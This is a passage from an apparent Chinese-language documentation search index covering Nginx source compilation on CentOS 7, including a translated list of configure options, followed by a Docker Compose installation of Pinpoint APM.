--with-http_image_filter_module \u542f\u7528 ngx_http_image_filter_module --with-http_image_filter_module=dynamic \u542f\u7528 dynamic ngx_http_image_filter_module --with-http_geoip_module \u542f\u7528 ngx_http_geoip_module --with-http_geoip_module=dynamic \u542f\u7528 dynamic ngx_http_geoip_module --with-http_sub_module \u542f\u7528 ngx_http_sub_module --with-http_dav_module \u542f\u7528 ngx_http_dav_module --with-http_flv_module \u542f\u7528 ngx_http_flv_module --with-http_mp4_module \u542f\u7528 ngx_http_mp4_module --with-http_gunzip_module \u542f\u7528 ngx_http_gunzip_module --with-http_gzip_static_module \u542f\u7528 ngx_http_gzip_static_module --with-http_auth_request_module \u542f\u7528 ngx_http_auth_request_module --with-http_random_index_module \u542f\u7528 ngx_http_random_index_module --with-http_secure_link_module \u542f\u7528 ngx_http_secure_link_module --with-http_degradation_module \u542f\u7528 ngx_http_degradation_module --with-http_slice_module \u542f\u7528 ngx_http_slice_module --with-http_stub_status_module \u542f\u7528 ngx_http_stub_status_module --without-http_charset_module \u7981\u7528 ngx_http_charset_module --without-http_gzip_module \u7981\u7528 ngx_http_gzip_module --without-http_ssi_module \u7981\u7528 ngx_http_ssi_module --without-http_userid_module \u7981\u7528 ngx_http_userid_module --without-http_access_module \u7981\u7528 ngx_http_access_module --without-http_auth_basic_module \u7981\u7528 ngx_http_auth_basic_module --without-http_mirror_module \u7981\u7528 ngx_http_mirror_module --without-http_autoindex_module \u7981\u7528 ngx_http_autoindex_module --without-http_geo_module \u7981\u7528 ngx_http_geo_module --without-http_map_module \u7981\u7528 ngx_http_map_module --without-http_split_clients_module \u7981\u7528 ngx_http_split_clients_module --without-http_referer_module \u7981\u7528 ngx_http_referer_module --without-http_rewrite_module \u7981\u7528 ngx_http_rewrite_module --without-http_proxy_module \u7981\u7528 ngx_http_proxy_module --without-http_fastcgi_module \u7981\u7528 ngx_http_fastcgi_module --without-http_uwsgi_module \u7981\u7528 ngx_http_uwsgi_module --without-http_scgi_module \u7981\u7528 ngx_http_scgi_module --without-http_grpc_module \u7981\u7528 ngx_http_grpc_module --without-http_memcached_module \u7981\u7528 ngx_http_memcached_module --without-http_limit_conn_module \u7981\u7528 ngx_http_limit_conn_module --without-http_limit_req_module \u7981\u7528 ngx_http_limit_req_module --without-http_empty_gif_module \u7981\u7528 ngx_http_empty_gif_module --without-http_browser_module \u7981\u7528 ngx_http_browser_module --without-http_upstream_hash_module \u7981\u7528 ngx_http_upstream_hash_module --without-http_upstream_ip_hash_module \u7981\u7528 ngx_http_upstream_ip_hash_module --without-http_upstream_least_conn_module \u7981\u7528 ngx_http_upstream_least_conn_module --without-http_upstream_random_module \u7981\u7528 ngx_http_upstream_random_module --without-http_upstream_keepalive_module \u7981\u7528 ngx_http_upstream_keepalive_module --without-http_upstream_zone_module \u7981\u7528 ngx_http_upstream_zone_module --with-http_perl_module \u542f\u7528 ngx_http_perl_module --with-http_perl_module=dynamic \u542f\u7528 dynamic ngx_http_perl_module --with-perl_modules_path=PATH \u8bbe\u7f6ePerl\u6a21\u5757\u8def\u5f84 --with-perl=PATH \u8bbe\u7f6eperl\u4e8c\u8fdb\u5236\u8def\u5f84\u540d --http-log-path=PATH \u8bbe\u7f6ehttp\u8bbf\u95ee\u65e5\u5fd7\u8def\u5f84\u540d --http-client-body-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http\u5ba2\u6237\u7aef\u8bf7\u6c42\u6b63\u6587\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --http-proxy-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http\u4ee3\u7406\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --http-fastcgi-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http fastcgi\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --http-uwsgi-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http uwsgi\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --http-scgi-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http scgi\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --without-http \u7981\u7528HTTP\u670d\u52a1\u5668 --without-http-cache \u7981\u7528HTTP\u7f13\u5b58 --with-mail \u542f\u7528POP3/IMAP4/SMTP\u4ee3\u7406\u6a21\u5757 --with-mail=dynamic \u542f\u7528\u52a8\u6001POP3/IMAP4/SMTP\u4ee3\u7406\u6a21\u5757 --with-mail_ssl_module \u542f\u7528 ngx_mail_ssl_module --without-mail_pop3_module \u7981\u7528 ngx_mail_pop3_module --without-mail_imap_module \u7981\u7528 ngx_mail_imap_module --without-mail_smtp_module \u7981\u7528 ngx_mail_smtp_module --with-stream \u542f\u7528TCP/UDP\u4ee3\u7406\u6a21\u5757 --with-stream=dynamic \u542f\u7528\u52a8\u6001TCP/UDP\u4ee3\u7406\u6a21\u5757 --with-stream_ssl_module \u542f\u7528 ngx_stream_ssl_module --with-stream_realip_module \u542f\u7528 ngx_stream_realip_module --with-stream_geoip_module \u542f\u7528 ngx_stream_geoip_module --with-stream_geoip_module=dynamic \u542f\u7528 dynamic ngx_stream_geoip_module --with-stream_ssl_preread_module \u542f\u7528 ngx_stream_ssl_preread_module --without-stream_limit_conn_module \u7981\u7528 ngx_stream_limit_conn_module --without-stream_access_module \u7981\u7528 ngx_stream_access_module --without-stream_geo_module \u7981\u7528 ngx_stream_geo_module --without-stream_map_module \u7981\u7528 ngx_stream_map_module --without-stream_split_clients_module \u7981\u7528 ngx_stream_split_clients_module --without-stream_return_module \u7981\u7528 ngx_stream_return_module --without-stream_set_module \u7981\u7528 ngx_stream_set_module --without-stream_upstream_hash_module \u7981\u7528 ngx_stream_upstream_hash_module --without-stream_upstream_least_conn_module \u7981\u7528 ngx_stream_upstream_least_conn_module --without-stream_upstream_random_module \u7981\u7528 ngx_stream_upstream_random_module --without-stream_upstream_zone_module \u7981\u7528 ngx_stream_upstream_zone_module --with-google_perftools_module \u542f\u7528 ngx_google_perftools_module --with-cpp_test_module \u542f\u7528 ngx_cpp_test_module --add-module=PATH \u542f\u7528 external module --add-dynamic-module=PATH \u542f\u7528 dynamic external module --with-compat \u52a8\u6001\u6a21\u5757\u517c\u5bb9\u6027 --with-cc=PATH \u8bbe\u7f6eC\u7f16\u8bd1\u5668\u8def\u5f84\u540d --with-cpp=PATH \u8bbe\u7f6eC\u9884\u5904\u7406\u5668\u8def\u5f84\u540d --with-cc-opt=OPTIONS \u8bbe\u7f6e\u989d\u5916\u7684C\u7f16\u8bd1\u5668\u9009\u9879 --with-ld-opt=OPTIONS \u8bbe\u7f6e\u989d\u5916\u7684\u94fe\u63a5\u5668\u9009\u9879 --with-cpu-opt=CPU \u4e3a\u6307\u5b9a\u7684CPU\u6784\u5efa\uff0c\u6709\u6548\u503c\uff1apentium, pentiumpro, pentium3, pentium4,athlon, opteron, sparc32, sparc64, ppc64 --without-pcre \u7981\u7528PCRE\u5e93\u7684\u4f7f\u7528 --with-pcre \u5f3a\u5236\u4f7f\u7528PCRE\u5e93 --with-pcre=DIR \u8bbe\u7f6ePCRE\u5e93\u6e90\u7801\u7684\u8def\u5f84 --with-pcre-opt=OPTIONS \u4e3aPCRE\u8bbe\u7f6e\u989d\u5916\u7684\u6784\u5efa\u9009\u9879 --with-pcre-jit \u4f7f\u7528JIT\u7f16\u8bd1\u652f\u6301\u6784\u5efaPCRE --without-pcre2 \u4e0d\u8981\u4f7f\u7528PCRE2\u5e93 --with-zlib=DIR \u8bbe\u7f6ezlib\u5e93\u6e90\u7684\u8def\u5f84 --with-zlib-opt=OPTIONS \u4e3azlib\u8bbe\u7f6e\u989d\u5916\u7684\u6784\u5efa\u9009\u9879 --with-zlib-asm=CPU \u4f7f\u7528\u4e3a\u6307\u5b9aCPU\u4f18\u5316\u7684zlib\u6c47\u7f16\u6e90\uff0c\u6709\u6548\u503c\uff1apentium\uff0cpentiumpro --with-libatomic \u5f3a\u5236 libatomic_ops \u5e93\u4f7f\u7528 --with-libatomic=DIR \u8bbe\u7f6elibatomic_ops\u5e93\u6e90\u7684\u8def\u5f84 --with-openssl=DIR \u8bbe\u7f6eOpenSSL\u5e93\u6e90\u7684\u8def\u5f84 --with-openssl-opt=OPTIONS \u4e3aOpenSSL\u8bbe\u7f6e\u989d\u5916\u7684\u6784\u5efa\u9009\u9879 --with-debug \u542f\u7528\u8c03\u8bd5\u65e5\u5fd7\u8bb0\u5f55","title":"Nginx\u90e8\u7f72"},{"location":"middleware/nginx/nginx_install/#nginx","text":"\u6e90\u7801\uff1ahttps://trac.nginx.org/nginx/browser \u5b98\u7f51\uff1ahttp://www.nginx.org/ \u4e2d\u6587\u6559\u7a0b\uff1ahttps://github.com/taobao/nginx-book \u4e2d\u6587\u7b80\u5355\u6559\u7a0b\uff1ahttps://github.com/dunwu/nginx-tutorial","title":"Nginx\u76f8\u5173\u5730\u5740"},{"location":"middleware/nginx/nginx_install/#nginx_1","text":"nginx\u6700\u5e38\u89c1\u7684\u5b89\u88c5\u65b9\u5f0f\u662f\u6e90\u7801\u8fdb\u884c\u5b89\u88c5\uff0c\u4e3b\u8981\u539f\u56e0\u662f\u597d\u7ef4\u62a4\uff0c\u867d\u7136\u5b98\u65b9\u63d0\u4f9b\u4e86rpm\uff0cYUM\u7b49\u5b89\u88c5\u65b9\u5f0f\u3002\u4e0b\u9762\u7684\u90e8\u7f72\u65b9\u5f0f\u662f\u5728CentOS7\u4e0b \u901a\u5e38\u4f1a\u628a\u6e90\u7801\u5305\u653e\u5728Linux\u7cfb\u7edf\u4e2d\u7684 /usr/local/src \u76ee\u5f55\u4e0b\uff0c\u8fd9\u4e2a\u76ee\u5f55\u662f\u5b58\u653e\u672c\u5730\u6e90\u4ee3\u7801\u7684\u76ee\u5f55 \u8fd9\u4e2a\u76ee\u5f55\u7684\u4f7f\u7528\u89c4\u5219\u662f\u4e2a\u7ea6\u5b9a\u4fd7\u79f0\u7684\u4e00\u4e2a\u89c4\u8303\uff0c\u8fd9\u91cc\u653e\u4e00\u4e2a\u767e\u79d1\u5730\u5740\uff1a Filesystem Hierarchy Standard - Wikipedia \uff0c\u767e\u79d1\u4e0b\u9762\u6709Linux\u57fa\u91d1\u4f1a\u5b98\u65b9\u7684\u5730\u5740 Linux\u57fa\u91d1\u4f1a\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7f51\u9875\u7248\u672c\u7684\u76ee\u5f55\u4ecb\u7ecd\uff1a 4.9. /usr/local : Local hierarchy (linuxfoundation.org)","title":"Nginx\u5b89\u88c5"},{"location":"middleware/nginx/nginx_install/#1","text":"[root@VM-0-16-centos src]# yum install -y gcc gcc-c++ make zlib zlib-devel gcc-c++ openssl-devel [root@VM-0-16-centos src]# yum install -y libtool [root@VM-0-16-centos src]# yum install -y openssl \u5b89\u88c5\u4f9d\u8d56 pcre2 PCRE\u5b98\u7f51 PCRE - Perl Compatible Regular Expressions [root@VM-0-16-centos ~]# cd /usr/local/src [root@VM-0-16-centos src]# wget https://github.com/PCRE2Project/pcre2/releases/download/pcre2-10.42/pcre2-10.42.tar.gz [root@VM-0-16-centos src]# ls pcre2-10.42.tar.gz [root@VM-0-16-centos src]# tar -zxvf pcre2-10.42.tar.gz [root@VM-0-16-centos src]# ls pcre2-10.42 pcre2-10.42.tar.gz [root@VM-0-16-centos src]# cd pcre2-10.42 [root@bogon pcre2-10.42]# ./configure [root@bogon pcre2-10.42]# make && make install","title":"1\u3001\u5b89\u88c5\u4f9d\u8d56"},{"location":"middleware/nginx/nginx_install/#2","text":"\u5b98\u7f51\u4e0b\u8f7d\u5730\u5740\uff1a nginx: \u4e0b\u8f7d (p2hp.com) [root@VM-0-16-centos ~]# cd /usr/local/src [root@VM-0-16-centos src]# wget http://nginx.org/download/nginx-1.24.0.tar.gz nginx-1.24.0.tar.gz 100%[===================================================>] 1.06M 27.7KB/s in 54s [root@VM-0-16-centos src]# ls nginx-1.24.0.tar.gz","title":"2\u3001\u4e0b\u8f7d\u5b89\u88c5\u5305"},{"location":"middleware/nginx/nginx_install/#3","text":"\u89e3\u538b\u5b89\u88c5\u5305 [root@VM-0-16-centos src]# ls nginx-1.24.0.tar.gz pcre2-10.42 pcre2-10.42.tar.gz [root@VM-0-16-centos src]# tar -zxvf nginx-1.24.0.tar.gz [root@VM-0-16-centos src]# ls nginx-1.24.0 nginx-1.24.0.tar.gz pcre2-10.42 pcre2-10.42.tar.gz \u5bf9nginx\u7f16\u8bd1\u524d\u914d\u7f6e --prefix=/usr/local/webserver/nginx #\u5b89\u88c5\u8def\u5f84 --with-http_stub_status_module \u8be5\u6a21\u5757\u63d0\u4f9b \u8bbf\u95ee\u57fa\u672c\u72b6\u6001\u4fe1\u606f --with-http_ssl_module \u8be5\u6a21\u5757\u63d0\u4f9b \u5bf9 HTTPS \u7684\u5fc5\u8981\u652f\u6301 --with-pcre \u8bbe\u7f6e PCRE\u5e93\u7684\u6e90\u7801\u7684\u8def\u5f84\u3002 \u8be5\u5e93\u88abngx_http_rewrite_module\u6a21\u5757\u6240\u9700\u8981 [root@VM-0-16-centos src]# ls nginx-1.24.0 nginx-1.24.0.tar.gz pcre2-10.42 pcre2-10.42.tar.gz [root@VM-0-16-centos src]# cd nginx-1.24.0 [root@VM-0-16-centos nginx-1.24.0]# ./configure --prefix=/usr/local/webserver/nginx --with-http_stub_status_module --with-http_ssl_module --with-pcre=/usr/local/src/pcre2-10.42 ... ... Configuration summary + using PCRE2 library: /usr/local/src/pcre2-10.42 + using system OpenSSL library + using system zlib library nginx path prefix: \"/usr/local/webserver/nginx\" nginx binary file: \"/usr/local/webserver/nginx/sbin/nginx\" nginx modules path: \"/usr/local/webserver/nginx/modules\" nginx configuration prefix: \"/usr/local/webserver/nginx/conf\" nginx configuration file: \"/usr/local/webserver/nginx/conf/nginx.conf\" nginx pid file: \"/usr/local/webserver/nginx/logs/nginx.pid\" nginx error log file: \"/usr/local/webserver/nginx/logs/error.log\" nginx http access log file: \"/usr/local/webserver/nginx/logs/access.log\" nginx http client request body temporary files: \"client_body_temp\" nginx http proxy temporary files: \"proxy_temp\" nginx http fastcgi temporary files: \"fastcgi_temp\" nginx http uwsgi temporary files: \"uwsgi_temp\" nginx http scgi temporary files: \"scgi_temp\" [root@VM-0-16-centos nginx-1.24.0]# make && make install [root@VM-0-16-centos nginx]# pwd /usr/local/webserver/nginx [root@VM-0-16-centos nginx]# tree . \u251c\u2500\u2500 conf #\u9ed8\u8ba4\u914d\u7f6e\u76ee\u5f55 \u2502 \u251c\u2500\u2500 fastcgi.conf \u2502 \u251c\u2500\u2500 fastcgi.conf.default \u2502 \u251c\u2500\u2500 fastcgi_params \u2502 \u251c\u2500\u2500 fastcgi_params.default \u2502 \u251c\u2500\u2500 koi-utf \u2502 \u251c\u2500\u2500 koi-win \u2502 \u251c\u2500\u2500 mime.types \u2502 \u251c\u2500\u2500 mime.types.default \u2502 \u251c\u2500\u2500 nginx.conf \u2502 \u251c\u2500\u2500 nginx.conf.default \u2502 \u251c\u2500\u2500 scgi_params \u2502 \u251c\u2500\u2500 scgi_params.default \u2502 \u251c\u2500\u2500 uwsgi_params \u2502 \u251c\u2500\u2500 uwsgi_params.default \u2502 \u2514\u2500\u2500 win-utf \u251c\u2500\u2500 html #\u5b58\u653e\u7f51\u9875\u7684\u76ee\u5f55 \u2502 \u251c\u2500\u2500 50x.html \u2502 \u2514\u2500\u2500 index.html \u251c\u2500\u2500 logs #\u65e5\u5fd7\u76ee\u5f55 \u2514\u2500\u2500 sbin #nginx\u4e8c\u8fdb\u5236\u6587\u4ef6 \u2514\u2500\u2500 ngin","title":"3\u3001\u7f16\u8bd1\u5e76\u5b89\u88c5"},{"location":"middleware/nginx/nginx_install/#nginx-configure-help","text":"\u5b98\u7f51\u8bf4\u660e\uff1a \u4ece\u6e90\u4ee3\u7801\u6784\u5efanginx [root@VM-0-16-centos nginx-1.24.0]# ./configure --help --help \u6253\u5370\u6b64\u5e2e\u52a9 --prefix=PATH \u8bbe\u7f6e\u5b89\u88c5\u8def\u5f84 --sbin-path=PATH \u8bbe\u7f6enginx\u4e8c\u8fdb\u5236\u8def\u5f84 --modules-path=PATH \u8bbe\u7f6e\u6a21\u5757\u8def\u5f84 --conf-path=PATH \u8bbe\u7f6enginx.conf\u8def\u5f84 --error-log-path=PATH \u8bbe\u7f6eerror log\u8def\u5f84 --pid-path=PATH \u8bbe\u7f6enginx.pid\u8def\u5f84 --lock-path=PATH \u8bbe\u7f6enginx.lock\u8def\u5f84 --user=USER \u4e3a\u5de5\u4f5c\u8fdb\u7a0b\u8bbe\u7f6e\u975e\u7279\u6743\u7528\u6237 --group=GROUP \u4e3a\u5de5\u4f5c\u8fdb\u7a0b\u8bbe\u7f6e\u975e\u7279\u6743\u7528\u6237\u7ec4 --build=NAME \u8bbe\u7f6e build \u540d\u5b57 --builddir=DIR \u8bbe\u7f6e build \u76ee\u5f55 --with-select_module \u542f\u7528\u9009\u62e9\u6a21\u5757 --without-select_module \u7981\u7528\u9009\u62e9\u6a21\u5757 --with-poll_module \u542f\u7528polL\u6a21\u5757 --without-poll_module \u7981\u7528polL\u6a21\u5757 --with-threads \u542f\u7528\u7ebf\u7a0b\u6c60\u652f\u6301 --with-file-aio \u542f\u7528\u6587\u4ef6AIO\u652f\u6301 --with-http_ssl_module \u542f\u7528ngx_http_ssl_module --with-http_v2_module \u542f\u7528 ngx_http_v2_module --with-http_realip_module \u542f\u7528 ngx_http_realip_module --with-http_addition_module \u542f\u7528 ngx_http_addition_module --with-http_xslt_module \u542f\u7528 ngx_http_xslt_module --with-http_xslt_module=dynamic \u542f\u7528 dynamic ngx_http_xslt_module --with-http_image_filter_module \u542f\u7528 ngx_http_image_filter_module --with-http_image_filter_module=dynamic \u542f\u7528 dynamic ngx_http_image_filter_module --with-http_geoip_module \u542f\u7528 ngx_http_geoip_module --with-http_geoip_module=dynamic \u542f\u7528 dynamic ngx_http_geoip_module --with-http_sub_module \u542f\u7528 ngx_http_sub_module --with-http_dav_module \u542f\u7528 ngx_http_dav_module --with-http_flv_module \u542f\u7528 ngx_http_flv_module --with-http_mp4_module \u542f\u7528 ngx_http_mp4_module --with-http_gunzip_module \u542f\u7528 ngx_http_gunzip_module --with-http_gzip_static_module \u542f\u7528 ngx_http_gzip_static_module --with-http_auth_request_module \u542f\u7528 ngx_http_auth_request_module --with-http_random_index_module \u542f\u7528 ngx_http_random_index_module --with-http_secure_link_module \u542f\u7528 ngx_http_secure_link_module --with-http_degradation_module \u542f\u7528 ngx_http_degradation_module --with-http_slice_module \u542f\u7528 ngx_http_slice_module --with-http_stub_status_module \u542f\u7528 ngx_http_stub_status_module --without-http_charset_module \u7981\u7528 ngx_http_charset_module --without-http_gzip_module \u7981\u7528 ngx_http_gzip_module --without-http_ssi_module \u7981\u7528 ngx_http_ssi_module --without-http_userid_module \u7981\u7528 ngx_http_userid_module --without-http_access_module \u7981\u7528 ngx_http_access_module --without-http_auth_basic_module \u7981\u7528 ngx_http_auth_basic_module --without-http_mirror_module \u7981\u7528 ngx_http_mirror_module --without-http_autoindex_module \u7981\u7528 ngx_http_autoindex_module --without-http_geo_module \u7981\u7528 ngx_http_geo_module --without-http_map_module \u7981\u7528 ngx_http_map_module --without-http_split_clients_module \u7981\u7528 ngx_http_split_clients_module --without-http_referer_module \u7981\u7528 ngx_http_referer_module --without-http_rewrite_module \u7981\u7528 ngx_http_rewrite_module --without-http_proxy_module \u7981\u7528 ngx_http_proxy_module --without-http_fastcgi_module \u7981\u7528 ngx_http_fastcgi_module --without-http_uwsgi_module \u7981\u7528 ngx_http_uwsgi_module --without-http_scgi_module \u7981\u7528 ngx_http_scgi_module --without-http_grpc_module \u7981\u7528 ngx_http_grpc_module --without-http_memcached_module \u7981\u7528 ngx_http_memcached_module --without-http_limit_conn_module \u7981\u7528 ngx_http_limit_conn_module --without-http_limit_req_module \u7981\u7528 ngx_http_limit_req_module --without-http_empty_gif_module \u7981\u7528 ngx_http_empty_gif_module --without-http_browser_module \u7981\u7528 ngx_http_browser_module --without-http_upstream_hash_module \u7981\u7528 ngx_http_upstream_hash_module --without-http_upstream_ip_hash_module \u7981\u7528 ngx_http_upstream_ip_hash_module --without-http_upstream_least_conn_module \u7981\u7528 ngx_http_upstream_least_conn_module --without-http_upstream_random_module \u7981\u7528 ngx_http_upstream_random_module --without-http_upstream_keepalive_module \u7981\u7528 ngx_http_upstream_keepalive_module --without-http_upstream_zone_module \u7981\u7528 ngx_http_upstream_zone_module --with-http_perl_module \u542f\u7528 ngx_http_perl_module --with-http_perl_module=dynamic \u542f\u7528 dynamic ngx_http_perl_module --with-perl_modules_path=PATH \u8bbe\u7f6ePerl\u6a21\u5757\u8def\u5f84 --with-perl=PATH \u8bbe\u7f6eperl\u4e8c\u8fdb\u5236\u8def\u5f84\u540d --http-log-path=PATH \u8bbe\u7f6ehttp\u8bbf\u95ee\u65e5\u5fd7\u8def\u5f84\u540d --http-client-body-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http\u5ba2\u6237\u7aef\u8bf7\u6c42\u6b63\u6587\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --http-proxy-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http\u4ee3\u7406\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --http-fastcgi-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http fastcgi\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --http-uwsgi-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http uwsgi\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --http-scgi-temp-path=PATH \u8bbe\u7f6e\u5b58\u50a8http scgi\u4e34\u65f6\u6587\u4ef6\u7684\u8def\u5f84 --without-http \u7981\u7528HTTP\u670d\u52a1\u5668 --without-http-cache \u7981\u7528HTTP\u7f13\u5b58 --with-mail \u542f\u7528POP3/IMAP4/SMTP\u4ee3\u7406\u6a21\u5757 --with-mail=dynamic \u542f\u7528\u52a8\u6001POP3/IMAP4/SMTP\u4ee3\u7406\u6a21\u5757 --with-mail_ssl_module \u542f\u7528 ngx_mail_ssl_module --without-mail_pop3_module \u7981\u7528 ngx_mail_pop3_module --without-mail_imap_module \u7981\u7528 ngx_mail_imap_module --without-mail_smtp_module \u7981\u7528 ngx_mail_smtp_module --with-stream \u542f\u7528TCP/UDP\u4ee3\u7406\u6a21\u5757 --with-stream=dynamic \u542f\u7528\u52a8\u6001TCP/UDP\u4ee3\u7406\u6a21\u5757 --with-stream_ssl_module \u542f\u7528 ngx_stream_ssl_module --with-stream_realip_module \u542f\u7528 ngx_stream_realip_module --with-stream_geoip_module \u542f\u7528 ngx_stream_geoip_module --with-stream_geoip_module=dynamic \u542f\u7528 dynamic ngx_stream_geoip_module --with-stream_ssl_preread_module \u542f\u7528 ngx_stream_ssl_preread_module --without-stream_limit_conn_module \u7981\u7528 ngx_stream_limit_conn_module --without-stream_access_module \u7981\u7528 ngx_stream_access_module --without-stream_geo_module \u7981\u7528 ngx_stream_geo_module --without-stream_map_module \u7981\u7528 ngx_stream_map_module --without-stream_split_clients_module \u7981\u7528 ngx_stream_split_clients_module --without-stream_return_module \u7981\u7528 ngx_stream_return_module --without-stream_set_module \u7981\u7528 ngx_stream_set_module --without-stream_upstream_hash_module \u7981\u7528 ngx_stream_upstream_hash_module --without-stream_upstream_least_conn_module \u7981\u7528 ngx_stream_upstream_least_conn_module --without-stream_upstream_random_module \u7981\u7528 ngx_stream_upstream_random_module --without-stream_upstream_zone_module \u7981\u7528 ngx_stream_upstream_zone_module --with-google_perftools_module \u542f\u7528 ngx_google_perftools_module --with-cpp_test_module \u542f\u7528 ngx_cpp_test_module --add-module=PATH \u542f\u7528 external module --add-dynamic-module=PATH \u542f\u7528 dynamic external module --with-compat \u52a8\u6001\u6a21\u5757\u517c\u5bb9\u6027 --with-cc=PATH \u8bbe\u7f6eC\u7f16\u8bd1\u5668\u8def\u5f84\u540d --with-cpp=PATH \u8bbe\u7f6eC\u9884\u5904\u7406\u5668\u8def\u5f84\u540d --with-cc-opt=OPTIONS \u8bbe\u7f6e\u989d\u5916\u7684C\u7f16\u8bd1\u5668\u9009\u9879 --with-ld-opt=OPTIONS \u8bbe\u7f6e\u989d\u5916\u7684\u94fe\u63a5\u5668\u9009\u9879 --with-cpu-opt=CPU \u4e3a\u6307\u5b9a\u7684CPU\u6784\u5efa\uff0c\u6709\u6548\u503c\uff1apentium, pentiumpro, pentium3, pentium4,athlon, opteron, sparc32, sparc64, ppc64 --without-pcre \u7981\u7528PCRE\u5e93\u7684\u4f7f\u7528 --with-pcre \u5f3a\u5236\u4f7f\u7528PCRE\u5e93 --with-pcre=DIR \u8bbe\u7f6ePCRE\u5e93\u6e90\u7801\u7684\u8def\u5f84 --with-pcre-opt=OPTIONS \u4e3aPCRE\u8bbe\u7f6e\u989d\u5916\u7684\u6784\u5efa\u9009\u9879 --with-pcre-jit \u4f7f\u7528JIT\u7f16\u8bd1\u652f\u6301\u6784\u5efaPCRE --without-pcre2 \u4e0d\u8981\u4f7f\u7528PCRE2\u5e93 --with-zlib=DIR \u8bbe\u7f6ezlib\u5e93\u6e90\u7684\u8def\u5f84 --with-zlib-opt=OPTIONS \u4e3azlib\u8bbe\u7f6e\u989d\u5916\u7684\u6784\u5efa\u9009\u9879 --with-zlib-asm=CPU \u4f7f\u7528\u4e3a\u6307\u5b9aCPU\u4f18\u5316\u7684zlib\u6c47\u7f16\u6e90\uff0c\u6709\u6548\u503c\uff1apentium\uff0cpentiumpro --with-libatomic \u5f3a\u5236 libatomic_ops \u5e93\u4f7f\u7528 --with-libatomic=DIR \u8bbe\u7f6elibatomic_ops\u5e93\u6e90\u7684\u8def\u5f84 --with-openssl=DIR \u8bbe\u7f6eOpenSSL\u5e93\u6e90\u7684\u8def\u5f84 --with-openssl-opt=OPTIONS \u4e3aOpenSSL\u8bbe\u7f6e\u989d\u5916\u7684\u6784\u5efa\u9009\u9879 --with-debug \u542f\u7528\u8c03\u8bd5\u65e5\u5fd7\u8bb0\u5f55","title":"NGINX \u7f16\u8bd1\u7684\u9009\u9879  configure --help"},{"location":"middleware/pinpoint/pinpoint_install/","text":"Pinpoint\u90e8\u7f72 Pinpoint\u5b98\u65b9Git\u5e93\uff1ahttps://github.com/pinpoint-apm/pinpoint \u5b98\u65b9\u5b89\u88c5\u6307\u5357\uff1ahttps://pinpoint-apm.gitbook.io/pinpoint/getting-started/docker \u4e3b\u673a\u540d Pinpoint\u7248\u672c IP Cpu \u5185\u5b58 centos7 v2.3.0 192.168.70.151 4\u6838 8G \u5ba2\u6237\u7aef\uff1a \u673a\u5668\u90fd\u5173\u95edselinux\u548c\u9632\u706b\u5899 [root@centos7 ~]# yum install yum-utils device-mapper-persistent-data lvm2 openssl socat conntrack ebtables ipset [root@centos7 ~]# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo [root@centos7 ~]# yum list docker-ce --showduplicates | sort -r [root@centos7 ~]# yum install docker-ce [root@centos7 ~]# systemctl enable --now docker [root@centos7 ~]# sudo curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose [root@centos7 ~]# sudo chmod +x /usr/local/bin/docker-compose [root@centos7 ~]# sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose [root@centos7 ~]# docker version Client: Docker Engine - Community Version: 20.10.10 API version: 1.41 Go version: go1.16.9 Git commit: b485636 Built: Mon Oct 25 07:44:50 2021 OS/Arch: linux/amd64 Context: default Experimental: true Server: Docker Engine - Community Engine: Version: 20.10.10 API version: 1.41 (minimum version 1.12) Go version: go1.16.9 Git commit: e2f740d Built: Mon Oct 25 07:43:13 2021 OS/Arch: linux/amd64 Experimental: false containerd: Version: 1.4.11 GitCommit: 5b46e404f6b9f661a205e28d59c982d3634148f8 runc: Version: 1.0.2 GitCommit: v1.0.2-0-g52b36a2 docker-init: Version: 0.19.0 GitCommit: de40ad0 [root@centos7 ~]# docker-compose --version docker-compose version 1.29.2, build 5becea4c [root@centos7 ~]# git clone https://github.com/naver/pinpoint-docker.git [root@centos7 ~]# cd pinpoint-docker/ [root@centos7 ~]# git checkout 2.3.0 [root@centos7 ~]# docker-compose pull \u67e5\u770b\u914d\u7f6e\u6587\u4ef6 [root@centos7 ~]# vim .env \u90e8\u7f72\u542f\u52a8\uff0c\u9700\u8981\u4e0b\u8f7d\u955c\u50cf\uff0c\u5931\u8d25\u4e86\u5c31\u91cd\u8bd5 [root@centos7 ~]# docker-compose up -d \u8bbf\u95ee192.168.70.151:8079","title":"Pinpoint\u5b89\u88c5"},{"location":"middleware/pinpoint/pinpoint_install/#pinpoint","text":"Pinpoint\u5b98\u65b9Git\u5e93\uff1ahttps://github.com/pinpoint-apm/pinpoint \u5b98\u65b9\u5b89\u88c5\u6307\u5357\uff1ahttps://pinpoint-apm.gitbook.io/pinpoint/getting-started/docker \u4e3b\u673a\u540d Pinpoint\u7248\u672c IP Cpu \u5185\u5b58 centos7 v2.3.0 192.168.70.151 4\u6838 8G \u5ba2\u6237\u7aef\uff1a \u673a\u5668\u90fd\u5173\u95edselinux\u548c\u9632\u706b\u5899 [root@centos7 ~]# yum install yum-utils device-mapper-persistent-data lvm2 openssl socat conntrack ebtables ipset [root@centos7 ~]# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo [root@centos7 ~]# yum list docker-ce --showduplicates | sort -r [root@centos7 ~]# yum install docker-ce [root@centos7 ~]# systemctl enable --now docker [root@centos7 ~]# sudo curl -L 